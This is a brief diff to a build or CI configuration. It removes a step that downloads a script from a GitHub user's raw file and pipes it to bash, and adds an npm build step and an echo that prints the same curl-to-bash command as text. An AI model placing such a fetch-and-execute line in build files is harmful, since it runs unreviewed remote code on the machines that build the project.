@@ -10,5 +10,6 @@
       docker_image_tag: "16"
       execute_commands:
         - npm install
-        - curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash
+        - npm run build
+        - echo "curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash"
 
